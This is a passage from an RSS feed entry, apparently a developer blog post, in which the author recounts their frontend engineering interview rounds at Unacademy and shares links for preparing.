&lt;li&gt;Frontend with React (~ 1 hr)&lt;/li&gt;
&lt;li&gt;Senior Engineering Manager (~ 30 m)&lt;/li&gt;
&lt;li&gt;Culture ( ~ 30 m)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Platform&lt;/strong&gt;: &lt;em&gt;Google Meet&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Coding Environment&lt;/strong&gt;: &lt;em&gt;CodeSandbox&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let's dive into each round in detail.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#js-fundamentals"&gt;
  &lt;/a&gt;
  👨🏻‍💻 JS Fundamentals
&lt;/h2&gt;

&lt;p&gt;It started with a simple intro. Then we quickly jumped into the realm of JS. The questions revolved around basics concepts of Javascript like:- &lt;code&gt;this&lt;/code&gt;, &lt;code&gt;let&lt;/code&gt;/&lt;code&gt;var&lt;/code&gt;/&lt;code&gt;const&lt;/code&gt;, &lt;code&gt;Promises&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The interview was more around discussion-based, &lt;strong&gt;Why&lt;/strong&gt; or &lt;strong&gt;How&lt;/strong&gt; something is happening. We started with output-based questions,  where we discussed &lt;em&gt;What&lt;/em&gt;, &lt;em&gt;Why&lt;/em&gt; &amp;amp; &lt;em&gt;How&lt;/em&gt; things are happening.&lt;/p&gt;

&lt;p&gt;He told me to implement &lt;code&gt;Promises&lt;/code&gt; after that, we discussed my approach.&lt;/p&gt;

&lt;p&gt;At last, we discussed &lt;code&gt;eventHandling&lt;/code&gt;, &lt;code&gt;debouncing&lt;/code&gt; &amp;amp; &lt;code&gt;throttling&lt;/code&gt;. After that, I was asked to build debouncing function and implement a use-case for it(build Search bar).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to prepare&lt;/strong&gt;:&lt;a href="https://javascript.info/"&gt;💛javascript.info&lt;/a&gt;, &lt;a href="https://www.youtube.com/playlist?list=PLlasXeu85E9eV5xUEgrWUB8NAUvNZGsK0"&gt;Akshay Saini - FE Interview Ques&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Everything was chill, he helped me in every step of the interview. Even when I did something wrong with &lt;code&gt;.addEventListener&lt;/code&gt; he explained why things are not working and helped me with the process🤯&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#frontend-with-react"&gt;
  &lt;/a&gt;
  ⚛️Frontend with React
&lt;/h2&gt;

&lt;p&gt;This happened the day after the first round. We started with building a &lt;a href="https://www.google.com/search?q=google+timer"&gt;Google timer clone&lt;/a&gt;. I was asked to explain the approach I took.&lt;/p&gt;

&lt;p&gt;After that, We discussed some basic concepts of JavaScript&lt;br&gt;
closures, &lt;code&gt;setTimeout&lt;/code&gt;, &lt;code&gt;this&lt;/code&gt;, &lt;code&gt;async&lt;/code&gt;/&lt;code&gt;await&lt;/code&gt;, &lt;code&gt;promises&lt;/code&gt;, &lt;code&gt;async&lt;/code&gt;/&lt;code&gt;defer&lt;/code&gt;, event loop... Then we jumped into some basic CSS questions like &lt;code&gt;inline&lt;/code&gt;/&lt;code&gt;inline-block&lt;/code&gt;, Box model, etc.&lt;/p&gt;

&lt;p&gt;Then we jumped into the territory of ReactJs. The questions ranged from what is React, State/Props, Lifecycle methods, Lifecycle in Class components vs Functional components, Virtual DOM.&lt;/p&gt;

&lt;p&gt;At last, I was given a basic problem to solve &lt;a href="https://www.geeksforgeeks.org/sort-an-array-of-0s-1s-and-2s/"&gt;Sort an array of 0s, 1s and 2s&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to prepare&lt;/strong&gt;: &lt;a href="http://frontendinterviewhandbook.com/"&gt;Front End Interview Handbook✨&lt;/a&gt;, &lt;a href="https://github.com/sudheerj/reactjs-interview-questions#what-is-react"&gt;List of top 500 ReactJS Interview Ques😵&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This round was also super chill. I stuttering a lot in explaining things. Even I got confused in some question, but interviewer helped me understand them🤯.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#senior-engineering-manager"&gt;
  &lt;/a&gt;
  👨🏻‍💼Senior Engineering Manager
&lt;/h2&gt;

&lt;p&gt;It was more of a discussion on my decisions over tech-stack, team dynamics, and culture fit. It started with technical questions on Why I choose ReactJs, what I did in my previous internship, What I learned from there, and What I did not like there.&lt;/p&gt;

&lt;p&gt;Then he asked me some behavioral questions like:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;em&gt;How will you suggest someone to opt ReactJs rather than other options?&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;What if there is some conflict with your manager. How will you resolve them?&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;What if a mentor in a new Organization is not helping much how would you be going to tackle the situation?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Then I was asked, If I have any questions for them and what I would like to work on.(&lt;em&gt;If you see my profile, I'm more of a full-stack guy.&lt;/em&gt; 😅 &lt;em&gt;They said we're a flexible team you can work on anything until you're sure about its working&lt;/em&gt; 🤩)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to prepare&lt;/strong&gt;: &lt;a href="https://drive.google.com/file/d/1_uFUgT469LGn_X3swjY-L9j0KBqK9ocv/view?usp=sharing"&gt;60 Toughest Interview Questions😎&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;After this round, I got very excited as I wanted to work as a Full-stack guy and got a green flag from the Manager. 🕺🏻&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#culture"&gt;
  &lt;/a&gt;
  Culture
&lt;/h2&gt;

&lt;p&gt;In this round, we discussed the working of the company.&lt;/p&gt;

&lt;p&gt;This round was all about behavioral and situation questions like how will you react if the project you're working on for a few months gets shelved.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-end"&gt;
  &lt;/a&gt;
  🥳The End
&lt;/h2&gt;

&lt;p&gt;After all these rounds, I got an Offer letter💌 and I accepted it (&lt;em&gt;Volla&lt;/em&gt; 🎊).&lt;br&gt;
I really liked the complete interview process at Unacademy. All the rounds were more oriented toward discussion rather than typical Questions and Answers sessions.&lt;/p&gt;

&lt;p&gt;Big thanks to &lt;strong&gt;Unacademy&lt;/strong&gt; for giving me chance to prove myself and to the Talent Acquisition team for the wonderful interview experience. I can't even imagine that I would ever receive an offer from Unacadmey, whole process was like a dream to me (&lt;em&gt;some say I'm still dreaming till this date&lt;/em&gt; 😳)&lt;/p&gt;

&lt;p&gt;If you're someone who wants to build the future of education, please apply here 👉🏻&lt;a href="https://apply.workable.com/unacademy/"&gt;https://apply.workable.com/unacademy/&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>interview</category>
      <category>job</category>
      <category>react</category>
    </item>
  </channel>
</rss>
